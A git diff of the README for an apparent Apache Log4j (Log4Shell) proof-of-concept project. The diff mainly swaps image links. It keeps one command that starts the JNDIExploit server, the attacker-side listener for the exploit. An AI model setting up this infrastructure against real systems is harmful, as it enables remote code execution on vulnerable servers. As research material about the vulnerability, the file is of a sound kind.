@@ -1,17 +1,15 @@
 # apache_log4j_poc
 apache log4j poc—— base Maven
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/d11b7347edf2480a875ebfdd66ea2670.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16)
-
-
-
 使用[JNDIExploit](https://github.com/feihong-cs/JNDIExploit)开启jndi服务器：
 ```
 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.171.1 -l 12344 -p 9999 
 ```
-![在这里插入图片描述](https://img-blog.csdnimg.cn/8688b2a947334855ac43d72f79b870a9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16)
+![image](https://user-images.githubusercontent.com/49781523/145537707-1885a6f1-b51e-4f8a-a14d-701669568193.png)
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/e2e1d9d7530948fdb118ac124cabc012.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16)
+
+![image](https://user-images.githubusercontent.com/49781523/145537663-a1e1d368-d726-4a07-8453-158454ce1c45.png)
+
 
 参考文章：[https://www.codenong.com/f23e29b783ff38df36c9/](https://www.codenong.com/f23e29b783ff38df36c9/)
 
